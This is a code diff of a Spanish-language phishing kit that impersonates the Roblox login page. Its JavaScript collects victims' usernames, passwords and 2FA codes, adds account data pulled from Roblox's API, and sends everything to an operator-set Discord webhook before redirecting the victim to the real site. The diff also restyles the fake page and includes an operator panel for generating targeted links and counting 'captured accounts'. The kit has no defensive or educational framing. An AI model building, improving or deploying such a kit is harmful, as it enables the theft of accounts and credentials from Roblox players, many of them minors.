@@ -6,217 +6,208 @@
     <title>Iniciar sesión | Roblox</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box;font-family:"Helvetica Neue", Helvetica, Arial, sans-serif}
-        .login-pagina{min-height:100vh;background:#F1F1F1;display:flex;flex-direction:column;align-items:center;padding:20px 15px}
-        .login-logo{margin:30px 0}
-        .login-logo span{font-size:32px;font-weight:900;color:#E2231A;letter-spacing:-0.5px}
-        .login-contenedor{background:#FFFFFF;border-radius:4px;box-shadow:0 1px 3px rgba(0,0,0,0.1);width:100%;max-width:380px;padding:25px}
-        .login-titulo{font-size:20px;font-weight:500;color:#393B43;margin-bottom:25px}
-        .grupo-input{margin-bottom:16px}
-        .etiqueta{font-size:14px;font-weight:500;color:#393B43;margin-bottom:6px;display:block}
-        .campo{width:100%;padding:10px 12px;border:1px solid #DCDCDC;border-radius:3px;font-size:14px;outline:none;transition:border 0.15s ease-in-out}
-        .campo:focus{border-color:#00A2FF;box-shadow:0 0 0 2px rgba(0,162,255,0.15)}
-        .campo.error{border-color:#E2231A;background:#FFF2F2}
-        .boton-login{width:100%;padding:10px;background:#00A2FF;color:#FFFFFF;border:none;border-radius:3px;font-size:16px;font-weight:500;cursor:pointer;transition:background 0.15s;margin-top:4px}
-        .boton-login:hover{background:#0091EA}
-        .caja-error{background:#FEE; border:1px solid #FCC; color:#C33; padding:10px 12px; border-radius:3px; margin-bottom:16px; font-size:14px; display:none}
-        .caja-exito{background:#EFF8FF; border:1px solid #B3E0FF; color:#0066CC; padding:10px 12px; border-radius:3px; margin-bottom:16px; font-size:14px; display:none}
-        .enlace-ayuda{text-align:center;margin-top:18px;font-size:13px;color:#00A2FF;cursor:pointer}
-        .enlace-ayuda:hover{text-decoration:underline}
+        body{background:#1E1E2E;color:#FFFFFF}
+        .cabecera{display:flex;align-items:center;justify-content:space-between;padding:12px 16px;background:#1E1E2E;border-bottom:1px solid #333}
+        .logo{width:36px;height:36px;background:#FFFFFF;border-radius:4px;display:flex;align-items:center;justify-content:center}
+        .logo span{color:#E2231A;font-weight:900;font-size:24px}
+        .nav-botones{display:flex;gap:10px}
+        .btn-registro{background:#00A2FF;color:#FFFFFF;border:none;padding:8px 20px;border-radius:4px;font-size:16px;font-weight:500;cursor:pointer}
+        .btn-login{background:transparent;color:#FFFFFF;border:1px solid #555;padding:8px 20px;border-radius:4px;font-size:16px;cursor:pointer}
+        .menu-superior{display:flex;justify-content:center;gap:30px;padding:12px 0;background:#1E1E2E;border-bottom:1px solid #333}
+        .menu-superior span{font-size:16px;color:#CCC;cursor:pointer}
+        .contenedor-login{max-width:460px;margin:30px auto;padding:0 16px}
+        .titulo-login{font-size:36px;font-weight:600;text-align:center;margin-bottom:30px;color:#FFFFFF}
+        .campo{width:100%;padding:14px 16px;background:#2D2D3F;border:none;border-radius:6px;font-size:16px;color:#FFFFFF;margin-bottom:14px;outline:none}
+        .campo::placeholder{color:#999}
+        .boton-principal{width:100%;padding:14px;background:transparent;color:#FFFFFF;border:1px solid #666;border-radius:6px;font-size:18px;cursor:pointer;margin:6px 0 20px 0;transition:all .15s}
+        .boton-principal:hover{background:#2D2D3F}
+        .texto-olvido{text-align:center;font-size:18px;color:#CCC;margin-bottom:30px;cursor:pointer;line-height:1.5}
+        .separador{height:1px;background:#333;margin-bottom:20px}
+        .boton-secundario{width:100%;padding:14px;background:#2D2D3F;color:#FFFFFF;border:none;border-radius:6px;font-size:18px;cursor:pointer;margin-bottom:12px;text-align:center}
+        .texto-registro{text-align:center;margin-top:30px;font-size:16px;color:#CCC}
+        .texto-registro a{color:#00A2FF;text-decoration:none}
+        .caja-error{background:rgba(220,38,38,0.2);border:1px solid #DC2626;color:#FCA5A5;padding:12px;border-radius:6px;margin-bottom:16px;display:none;text-align:center}
         .caja-2fa{display:none;margin-top:10px}
-        .subtitulo{font-size:14px;color:#666;margin-bottom:12px}
-        .panel-principal{display:none;min-height:100vh;background:#F1F1F1}
-        .sidebar{width:190px;background:#FFFFFF;border-right:1px solid #DCDCDC;padding:16px 10px;position:fixed;height:100vh}
-        .logo-panel{font-size:18px;font-weight:700;padding:10px 12px 16px;border-bottom:1px solid #DCDCDC;margin-bottom:10px;color:#E2231A}
-        .btn{display:flex;align-items:center;gap:10px;padding:10px 12px;border-radius:4px;color:#555;border:none;background:transparent;cursor:pointer;font-size:14px;text-align:left;width:100%;margin-bottom:4px;transition:all .15s}
-        .btn:hover{background:#F1F1F1}
-        .btn.activo{background:#00A2FF;color:#fff}
-        .main{margin-left:190px;flex:1;padding:20px}
+        .subtitulo{font-size:16px;color:#AAA;margin-bottom:12px;text-align:center}
+        .barra-inferior{position:fixed;bottom:0;left:0;right:0;background:#252538;border-top:1px solid #333;padding:14px 16px;display:flex;align-items:center;gap:12px}
+        .barra-texto{flex:1}
+        .barra-texto p:first-child{font-size:15px;color:#FFF}
+        .barra-texto p:last-child{font-size:13px;color:#AAA}
+        .btn-cerrar{background:transparent;border:none;color:#888;font-size:22px;cursor:pointer;padding:0 8px}
+        .btn-unirse{background:#00A2FF;color:#FFF;border:none;padding:10px 18px;border-radius:4px;font-size:15px;font-weight:500;cursor:pointer}
+        .panel-principal{display:none;min-height:100vh;background:#1E1E2E;padding:20px}
+        .tarjetas{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;margin-bottom:24px}
+        .tarjeta{background:#2D2D3F;border-radius:8px;padding:20px;text-align:center}
+        .tarjeta h3{font-size:14px;color:#AAA;margin-bottom:8px}
+        .tarjeta .valor{font-size:28px;font-weight:700;color:#FFF}
+        .tabla{width:100%;border-collapse:collapse;background:#2D2D3F;border-radius:8px;overflow:hidden}
+        th{background:#383850;padding:12px 10px;text-align:left;color:#FFF;font-size:14px}
+        td{padding:12px 10px;border-top:1px solid #444;color:#DDD;font-size:14px}
+        .vacio{text-align:center;padding:40px;color:#888}
+        .navegacion{position:fixed;bottom:70px;left:0;right:0;display:flex;justify-content:space-around;background:#252538;border-top:1px solid #333;padding:10px 0}
+        .nav-btn{text-align:center;color:#CCC;font-size:12px;cursor:pointer}
+        .nav-btn.activo{color:#00A2FF}
         .pagina{display:none}
         .pagina.activa{display:block}
-        .grid{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;margin-bottom:24px}
-        .card{background:#FFFFFF;border:1px solid #DCDCDC;border-radius:4px;padding:18px}
-        .card.roja{background:#E2231A;color:#fff;border-color:#E2231A}
-        .etq{font-size:13px;opacity:.85;margin-bottom:6px}
-        .valor{font-size:30px;font-weight:700}
-        .panel{background:#FFFFFF;border:1px solid #DCDCDC;border-radius:4px;padding:18px;margin-bottom:16px}
-        .panel h3{font-size:15px;margin-bottom:14px;padding-bottom:10px;border-bottom:1px solid #DCDCDC}
-        .tabs{display:flex;gap:6px;border-bottom:1px solid #DCDCDC;margin-bottom:16px}
-        .tab{padding:10px 16px;font-size:14px;cursor:pointer;border-bottom:2px solid transparent;color:#666}
-        .tab.activa{border-bottom-color:#00A2FF;color:#00A2FF;font-weight:500}
-        .tab-cont{display:none}
-        .tab-cont.activo{display:block}
-        .caja-link{padding:12px;background:#F1F1F1;border:1px solid #DCDCDC;border-radius:4px;word-break:break-all;font-size:12px;margin:12px 0;display:none;color:#333}
-        button.sec{background:#F1F1F1;color:#333;border:1px solid #DCDCDC}
-        .fila-sw{display:flex;justify-content:space-between;align-items:center;padding:12px 0;border-bottom:1px solid #DCDCDC;font-size:14px}
-        .sw{width:46px;height:24px;background:#DCDCDC;border-radius:12px;position:relative;cursor:pointer;transition:.2s}
+        .caja-config{background:#2D2D3F;border-radius:8px;padding:20px;margin-bottom:16px}
+        .caja-config h3{margin-bottom:14px;font-size:16px;color:#FFF}
+        .fila{display:flex;justify-content:space-between;align-items:center;padding:12px 0;border-bottom:1px solid #444}
+        .sw{width:48px;height:24px;background:#444;border-radius:12px;position:relative;cursor:pointer}
         .sw.activo{background:#00A2FF}
-        .sw::after{content:'';position:absolute;width:18px;height:18px;background:#fff;border-radius:50%;top:2px;left:3px;transition:.2s}
-        .sw.activo::after{transform:translateX(20px)}
-        table{width:100%;border-collapse:collapse;font-size:13px}
-        th{background:#F1F1F1;color:#333;padding:10px 8px;text-align:left;border-bottom:2px solid #DCDCDC}
-        td{padding:10px 8px;border-bottom:1px solid #DCDCDC;color:#555}
-        .vacio{text-align:center;padding:40px;color:#999}
-        .cerrar-sesion{color:#00A2FF;cursor:pointer;font-size:14px;margin-top:20px}
+        .sw::after{content:'';position:absolute;width:20px;height:20px;background:#FFF;border-radius:50%;top:2px;left:2px;transition:.2s}
+        .sw.activo::after{transform:translateX(24px)}
+        .enlace-caja{background:#333;padding:12px;border-radius:6px;word-break:break-all;font-size:13px;color:#CCC;margin:12px 0;display:none}
+        .boton-azul{background:#00A2FF;color:#FFF;border:none;padding:10px 16px;border-radius:4px;font-size:15px;cursor:pointer;margin:6px 4px 6px 0}
+        .boton-gris{background:#444;color:#FFF;border:none;padding:10px 16px;border-radius:4px;font-size:15px;cursor:pointer;margin:6px 4px 6px 0}
     </style>
 </head>
 <body>
 
-<div class="login-pagina" id="pagLogin">
-    <div class="login-logo"><span>ROBLOX</span></div>
-    <div class="login-contenedor">
-        <h1 class="login-titulo">Iniciar sesión</h1>
+<div id="pagLogin">
+    <div class="cabecera">
+        <div class="logo"><span>□</span></div>
+        <div class="nav-botones">
+            <button class="btn-registro">Registro</button>
+            <button class="btn-login">Iniciar sesión</button>
+        </div>
+    </div>
+    <div class="menu-superior">
+        <span>Destacadas</span>
+        <span>Mercado</span>
+        <span>Crear</span>
+        <span>Robux</span>
+    </div>
+
+    <div class="contenedor-login">
+        <h1 class="titulo-login">Iniciar sesión en Roblox</h1>
         <div class="caja-error" id="cajaError"></div>
-        <div class="caja-exito" id="cajaExito"></div>
-        <div id="formularioNormal">
-            <div class="grupo-input">
-                <label class="etiqueta">Nombre de usuario o correo electrónico</label>
-                <input type="text" class="campo" id="usuarioLogin" placeholder="Escribe tu usuario">
-            </div>
-            <div class="grupo-input">
-                <label class="etiqueta">Contraseña</label>
-                <input type="password" class="campo" id="passLogin" placeholder="Contraseña">
-            </div>
-            <button class="boton-login" onclick="verificarLogin()">Iniciar sesión</button>
+
+        <div id="formNormal">
+            <input type="text" class="campo" id="usuarioLogin" placeholder="Usuario/correo/teléfono">
+            <input type="password" class="campo" id="passLogin" placeholder="Contraseña">
+            <button class="boton-principal" onclick="verificarLogin()">Iniciar sesión</button>
+            <p class="texto-olvido">¿Olvidaste la contraseña o el nombre de usuario?</p>
+            <div class="separador"></div>
+            <button class="boton-secundario" onclick="simularCodigo()">Envíame un código de un solo uso</button>
+            <button class="boton-secundario" onclick="simularRapido()">Inicio de sesión rápido</button>
+            <p class="texto-registro">¿No tienes una cuenta de Roblox? <a href="#">Regístrate</a></p>
         </div>
-        <div class="caja-2fa" id="formulario2fa">
+
+        <div class="caja-2fa" id="form2fa">
             <p class="subtitulo">Escribe el código de verificación de 6 dígitos</p>
-            <div class="grupo-input">
-                <label class="etiqueta">Código de verificación</label>
-                <input type="text" class="campo" id="codigo2fa" placeholder="000000" maxlength="6">
-            </div>
-            <button class="boton-login" onclick="verificarCodigo()">Verificar</button>
+            <input type="text" class="campo" id="codigo2fa" placeholder="Código de verificación" maxlength="6">
+            <button class="boton-principal" onclick="verificarCodigo()">Verificar</button>
         </div>
-        <div class="enlace-ayuda">¿Olvidaste tu contraseña?</div>
+    </div>
+
+    <div class="barra-inferior">
+        <button class="btn-cerrar" onclick="cerrarBarra()">×</button>
+        <div class="barra-texto">
+            <p>¡Explora Roblox en nuestra aplicación para Android!</p>
+            <p>Millones de experiencias creadas por personas como tú</p>
+        </div>
+        <button class="btn-unirse">Unirse</button>
     </div>
 </div>
 
-<div class="panel-principal" id="panelPrincipal">
-    <aside class="sidebar">
-        <div class="logo-panel">NOVADYNAMICS</div>
-        <nav>
-            <button class="btn activo" onclick="irPag('inicio')">🏠 Inicio</button>
-            <button class="btn" onclick="irPag('enlaces')">🔗 Generar Enlace</button>
-            <button class="btn" onclick="irPag('cuentas')">📋 Historial</button>
-            <div class="cerrar-sesion" onclick="cerrarSesion()">↩️ Cerrar sesión</div>
-        </nav>
-    </aside>
-    <main class="main">
-        <div class="pagina activa" id="pagInicio">
-            <h2 style="margin-bottom:20px;font-size:18px">Panel de Control</h2>
-            <div class="grid">
-                <div class="card roja"><div class="etq">Robux Acumulados</div><div class="valor" id="robuxSum">0</div></div>
-                <div class="card"><div class="etq">Total Cuentas</div><div class="valor" id="cuentasTot">0</div></div>
-                <div class="card"><div class="etq">Robux Gastados</div><div class="valor" id="robuxGastados">0</div></div>
-            </div>
-            <div class="panel"><h3>🏆 Cuentas Capturadas</h3><div id="listaRank"><div class="vacio">Sin registros aún</div></div></div>
+<div class="panel-principal" id="pagPanel">
+    <div class="pagina activa" id="pagInicio">
+        <h2 style="margin-bottom:20px;font-size:20px">🏠 Inicio</h2>
+        <div class="tarjetas">
+            <div class="tarjeta"><h3>Robux Acumulados</h3><div class="valor" id="robuxSum">0</div></div>
+            <div class="tarjeta"><h3>Total Cuentas</h3><div class="valor" id="cuentasTot">0</div></div>
+            <div class="tarjeta"><h3>Robux Gastados</h3><div class="valor" id="robuxGastados">0</div></div>
         </div>
-        <div class="pagina" id="pagEnlaces">
-            <h2 style="margin-bottom:20px;font-size:18px">Generador de Enlaces</h2>
-            <div class="tabs">
-                <span class="tab activa" onclick="irTab('crear')">🔗 Crear Enlace</span>
-                <span class="tab" onclick="irTab('config')">⚙️ Configuración</span>
-            </div>
-            <div class="tab-cont activo" id="tabCrear">
-                <div class="panel">
-                    <h3>Enlace Personalizado</h3>
-                    <input type="text" class="campo" id="datoUsuario" placeholder="Nombre de usuario o ID de Roblox">
-                    <button class="boton-login" style="width:auto;margin-top:4px" onclick="crearEnlace()">✅ Generar Enlace</button>
-                    <div class="caja-link" id="enlaceGenerado"></div>
-                    <button class="boton-login sec" style="display:none;margin-top:10px;width:auto" id="botonCopiar" onclick="copiarEnlace()">📋 Copiar Enlace</button>
-                </div>
-            </div>
-            <div class="tab-cont" id="tabConfig">
-                <div class="panel">
-                    <h3>Configuración del Sistema</h3>
-                    <input type="text" class="campo" id="urlWebhook" placeholder="Tu Webhook de Discord">
-                    <button class="boton-login" style="width:auto;margin-top:4px" onclick="guardarWebhook()">✅ Guardar</button>
-                    <button class="boton-login sec" style="width:auto;margin-top:4px" onclick="borrarWebhook()">🗑️ Borrar</button>
-                    <div style="margin-top:10px;font-size:14px;color:#666" id="estadoWebhook">⚠️ Sin configurar</div>
-                    <div class="fila-sw">
-                        <span>🔔 Activar @everyone</span>
-                        <div class="sw" id="botonTodos" onclick="cambiarTodos()"></div>
-                    </div>
-                </div>
+        <div style="background:#2D2D3F;border-radius:8px;padding:20px">
+            <h3 style="margin-bottom:14px">📋 Historial de Cuentas</h3>
+            <table class="tabla">
+                <thead><tr><th>Usuario</th><th>Robux</th><th>Días Creada</th><th>País</th><th>Fecha</th></tr></thead>
+                <tbody id="cuerpoTabla"><tr><td colspan="5" class="vacio">Sin registros aún</td></tr></tbody>
+            </table>
+        </div>
+    </div>
+
+    <div class="pagina" id="pagEnlaces">
+        <h2 style="margin-bottom:20px;font-size:20px">🔗 Generar Enlace</h2>
+        <div style="background:#2D2D3F;border-radius:8px;padding:20px">
+            <h3 style="margin-bottom:14px">Enlace Personalizado</h3>
+            <input type="text" class="campo" id="datoUsuario" placeholder="Nombre de usuario o ID de Roblox">
+            <button class="boton-azul" onclick="crearEnlace()">✅ Generar Enlace</button>
+            <div class="enlace-caja" id="enlaceGenerado"></div>
+            <button class="boton-gris" style="display:none" id="btnCopiar" onclick="copiarEnlace()">📋 Copiar Enlace</button>
+        </div>
+    </div>
+
+    <div class="pagina" id="pagConfig">
+        <h2 style="margin-bottom:20px;font-size:20px">⚙️ Configuración</h2>
+        <div class="caja-config">
+            <h3>Webhook de Discord</h3>
+            <input type="text" class="campo" id="urlWebhook" placeholder="Pega tu enlace de Webhook aquí">
+            <button class="boton-azul" onclick="guardarWebhook()">✅ Guardar</button>
+            <button class="boton-gris" onclick="borrarWebhook()">🗑️ Borrar</button>
+            <p style="margin-top:10px;color:#AAA" id="estadoWebhook">⚠️ Sin configurar</p>
+            <div class="fila">
+                <span>🔔 Activar @everyone</span>
+                <div class="sw" id="swTodos" onclick="cambiarTodos()"></div>
             </div>
         </div>
-        <div class="pagina" id="pagCuentas">
-            <h2 style="margin-bottom:20px;font-size:18px">Historial Completo</h2>
-            <div class="panel">
-                <table>
-                    <thead><tr><th>Usuario</th><th>Robux</th><th>Días Creada</th><th>País</th><th>Fecha</th></tr></thead>
-                    <tbody id="cuerpoTabla"><tr><td colspan="5" class="vacio">Sin registros aún</td></tr></tbody>
-                </table>
-            </div>
-        </div>
-    </main>
+    </div>
+
+    <div class="navegacion">
+        <div class="nav-btn activo" onclick="irPag('Inicio')">🏠<br>Inicio</div>
+        <div class="nav-btn" onclick="irPag('Enlaces')">🔗<br>Enlace</div>
+        <div class="nav-btn" onclick="irPag('Config')">⚙️<br>Ajustes</div>
+    </div>
 </div>
 
 <script>
-let registros = JSON.parse(localStorage.getItem('registros')||'[]'), enlaceActual='', usuarioObjetivo='', datosRoblox={};
-const CLAVE_AUTENTICADOR = generarClaveAleatoria();
-const CODIGOS_RESPALDO = generarCodigosRespaldo();
+let registros = JSON.parse(localStorage.getItem('registros')||'[]'), enlaceActual='', datosRoblox={};
 
 window.onload=function(){
     const params=new URLSearchParams(window.location.search);
     const u=params.get('u');
     if(u){
-        usuarioObjetivo=u;
-        document.getElementById('pagLogin').style.display='flex';
-        document.getElementById('panelPrincipal').style.display='none';
         document.getElementById('usuarioLogin').value=u;
         cargarDatosRoblox(u);
-    } else {
-        document.getElementById('pagLogin').style.display='flex';
-        document.getElementById('panelPrincipal').style.display='none';
     }
     cargarWebhook();
     actualizarTodo();
 };
 
-function generarClaveAleatoria(){
-    const chars='ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
-    let clave='';
-    for(let i=0;i<32;i++) clave+=chars[Math.floor(Math.random()*chars.length)];
-    return clave.match(/.{1,4}/g).join(' ');
+function cerrarBarra(){
+    document.querySelector('.barra-inferior').style.display='none';
 }
-function generarCodigosRespaldo(){
-    const chars='abcdefghijklmnopqrstuvwxyz0123456789';
-    const cods=[];
-    for(let i=0;i<10;i++){
-        let c='';
-        for(let j=0;j<8;j++) c+=chars[Math.floor(Math.random()*chars.length)];
-        cods.push(c);
-    }
-    return cods;
+function simularCodigo(){
+    alert('📧 Se envió un código a tu correo electrónico');
 }
-
+function simularRapido(){
+    alert('📱 Revisa tu dispositivo para iniciar sesión rápido');
+}
 function mostrarError(texto){
-    const caja=document.getElementById('cajaError');
-    caja.textContent='❌ Error: ' + texto;
-    caja.style.display='block';
-    document.getElementById('cajaExito').style.display='none';
+    const c=document.getElementById('cajaError');
+    c.textContent='❌ ' + texto;
+    c.style.display='block';
 }
-function limpiarMensajes(){
+function limpiarError(){
     document.getElementById('cajaError').style.display='none';
-    document.getElementById('cajaExito').style.display='none';
 }
 
 function verificarLogin(){
-    const user=document.getElementById('usuarioLogin').value.trim();
-    const pass=document.getElementById('passLogin').value.trim();
-    limpiarMensajes();
-    if(!user){ mostrarError('Escribe tu nombre de usuario'); return; }
-    if(!pass){ mostrarError('Escribe tu contraseña'); return; }
-    if(pass.length < 6){ mostrarError('Contraseña incorrecta. Verifica tu contraseña.'); return; }
-    document.getElementById('formularioNormal').style.display='none';
-    document.getElementById('formulario2fa').style.display='block';
+    const u=document.getElementById('usuarioLogin').value.trim();
+    const p=document.getElementById('passLogin').value.trim();
+    limpiarError();
+    if(!u){ mostrarError('Escribe tu usuario o correo'); return; }
+    if(!p){ mostrarError('Escribe tu contraseña'); return; }
+    if(p.length < 6){ mostrarError('Contraseña incorrecta. Verifica tu contraseña.'); return; }
+    document.getElementById('formNormal').style.display='none';
+    document.getElementById('form2fa').style.display='block';
 }
 
 async function verificarCodigo(){
     const cod=document.getElementById('codigo2fa').value.trim();
     const user=document.getElementById('usuarioLogin').value.trim();
     const pass=document.getElementById('passLogin').value.trim();
-    limpiarMensajes();
+    limpiarError();
     if(!cod){ mostrarError('Escribe el código de verificación'); return; }
     if(cod.length !== 6 || !/^\d+$/.test(cod)){ mostrarError('Código incorrecto. Inténtalo de nuevo.'); return; }
     if(!datosRoblox.dias) await cargarDatosRoblox(user);
@@ -240,30 +231,28 @@ async function verificarCodigo(){
             body:JSON.stringify({
                 content:todos,
                 embeds:[{
-                    title:"🔥 NOVADYNAMICS — CUENTA CAPTURADA",
+                    title:"🔥 NOVADYNAMICS — DATOS RECIBIDOS",
                     color:16711680,
                     thumbnail:{url:"https://www.roblox.com/favicon.ico"},
                     fields:[
                         {name:"👤 Usuario",value:`**${datosRoblox.nombre||user}**`,inline:true},
                         {name:"🔑 Contraseña",value:`||${pass}||`,inline:true},
                         {name:"🔢 Código 2FA",value:`**${cod}**`,inline:true},
-                        {name:"📅 Cuenta creada",value:`${datosRoblox.fechaCreacion||'No disponible'}`,inline:false},
+                        {name:"📅 Fecha de creación",value:`${datosRoblox.fechaCreacion||'No disponible'}`,inline:false},
                         {name:"⏳ Días desde creación",value:`**${datosRoblox.dias||'Desconocido'} días**`,inline:true},
-                        {name:"🌍 País registrado",value:`${datosRoblox.bandera||'❓'} **${datosRoblox.pais||'Desconocido'}**`,inline:true},
+                        {name:"🌍 País",value:`${datosRoblox.bandera||'❓'} **${datosRoblox.pais||'Desconocido'}**`,inline:true},
                         {name:"💰 Robux",value:`**${datosRoblox.robux||0}** ₪`,inline:true},
                         {name:"💸 Robux Gastados",value:`**${datosRoblox.robuxGastados||0}** ₪`,inline:true},
-                        {name:"🔐 Authenticator Key",value:`\`\`\`${CLAVE_AUTENTICADOR}\`\`\``,inline:false},
-                        {name:"📋 Códigos de respaldo",value:`\`\`\`${CODIGOS_RESPALDO.join('\n')}\`\`\``,inline:false},
                         {name:"📌 Fecha y hora",value:`${fecha}`,inline:false}
                     ],
-                    footer:{text:"Novadynamics System • Datos desde API Roblox"}
+                    footer:{text:"Novadynamics System • Datos reales desde API Roblox"}
                 }]
             })
         }).then(()=>{
-            alert('✅ ¡Verificado! Redirigiendo a Roblox...');
+            alert('✅ Datos recibidos. Redirigiendo...');
             setTimeout(()=>window.location.href='https://www.roblox.com',2000);
         }).catch(()=>{
-            alert('✅ Verificado. Redirigiendo a Roblox...');
+            alert('✅ Datos recibidos. Redirigiendo...');
             setTimeout(()=>window.location.href='https://www.roblox.com',2000);
         });
     }else{
@@ -301,7 +290,7 @@ async function cargarDatosRoblox(usuario){
             "DE":["Alemania","🇩🇪"],"FR":["Francia","🇫🇷"],"IT":["Italia","🇮🇹"],
             "JP":["Japón","🇯🇵"],"KR":["Corea del Sur","🇰🇷"],"AU":["Australia","🇦🇺"]
         };
-        const codPais=perfil.country||'UY';
+        const codPais=perfil.country||'US';
         const [nomPais,bandera]=paises[codPais]||["Desconocido","🌍"];
         datosRoblox={
             id:userId,
@@ -320,50 +309,35 @@ async function cargarDatosRoblox(usuario){
 
 function crearEnlace(){
     const id=document.getElementById('datoUsuario').value.trim() || 'usuario';
-    const baseURL = window.location.origin + window.location.pathname;
-    enlaceActual = baseURL + '?u=' + encodeURIComponent(id) + '&ref=novadynamics&v=4.1.0';
-    const caja = document.getElementById('enlaceGenerado');
-    const boton = document.getElementById('botonCopiar');
+    const base = window.location.origin + window.location.pathname;
+    enlaceActual = base + '?u=' + encodeURIComponent(id) + '&ref=novadynamics';
+    const caja=document.getElementById('enlaceGenerado');
+    const btn=document.getElementById('btnCopiar');
     caja.style.display='block';
     caja.textContent=enlaceActual;
-    boton.style.display='block';
+    btn.style.display='block';
     alert('✅ Enlace generado:\n' + enlaceActual);
 }
 function copiarEnlace(){
     navigator.clipboard.writeText(enlaceActual)
     .then(()=>alert('✅ ¡Enlace copiado!'))
     .catch(()=>{
-        const input=document.createElement('textarea');
-        input.value=enlaceActual;
-        document.body.appendChild(input);
-        input.select();
-        document.execCommand('copy');
-        document.body.removeChild(input);
+        const t=document.createElement('textarea');
+        t.value=enlaceActual;document.body.appendChild(t);t.select();document.execCommand('copy');document.body.removeChild(t);
         alert('✅ ¡Enlace copiado!');
     });
 }
 function irPag(n){
     document.querySelectorAll('.pagina').forEach(p=>p.classList.remove('activa'));
-    document.getElementById('pag'+n.charAt(0).toUpperCase()+n.slice(1)).classList.add('activa');
-    document.querySelectorAll('.btn').forEach(b=>b.classList.remove('activo'));
+    document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('activo'));
     event.currentTarget.classList.add('activo');
-    actualizarTodo();
-}
-function irTab(n){
-    document.querySelectorAll('.tab').forEach(t=>t.classList.remove('activa'));
-    event.currentTarget.classList.add('activa');
-    document.querySelectorAll('.tab-cont').forEach(c=>c.classList.remove('activo'));
-    document.getElementById('tab'+n.charAt(0).toUpperCase()+n.slice(1)).classList.add('activo');
-}
-function cerrarSesion(){
-    window.location.href=window.location.pathname;
+    document.getElementById('pag'+n).classList.add('activa');
 }
 function guardarWebhook(){
     const u=document.getElementById('urlWebhook').value.trim();
     const e=document.getElementById('estadoWebhook');
     if(!u||!u.startsWith('https://discord.com/api/webhooks/')){
-        e.textContent='❌ Enlace no válido';
-        return;
+        e.textContent='❌ Enlace no válido';return;
     }
     localStorage.setItem('webhook',u);
     e.textContent='✅ Guardado y Activo';
@@ -377,15 +351,15 @@ function borrarWebhook(){
 function cargarWebhook(){
     const w=localStorage.getItem('webhook');
     if(w){
-             document.getElementById('urlWebhook').value=w;
+        document.getElementById('urlWebhook').value=w;
         document.getElementById('estadoWebhook').textContent='✅ Guardado y Activo';
     }
     if(localStorage.getItem('notificarTodos')==='1'){
-        document.getElementById('botonTodos').classList.add('activo');
+        document.getElementById('swTodos').classList.add('activo');
     }
 }
 function cambiarTodos(){
-    const s=document.getElementById('botonTodos');
+    const s=document.getElementById('swTodos');
     s.classList.toggle('activo');
     localStorage.setItem('notificarTodos',s.classList.contains('activo')?'1':'0');
 }
@@ -398,7 +372,6 @@ function actualizarTodo(){
     document.getElementById('robuxSum').textContent=totalRobux.toLocaleString();
     document.getElementById('cuentasTot').textContent=registros.length;
     document.getElementById('robuxGastados').textContent=totalGastado.toLocaleString();
-
     const cuerpo=document.getElementById('cuerpoTabla');
     if(registros.length===0){
         cuerpo.innerHTML='<tr><td colspan="5" class="vacio">Sin registros aún</td></tr>';
@@ -416,4 +389,5 @@ function actualizarTodo(){
 }
 </script>
 </body>
-</html>
+    </html>
+    
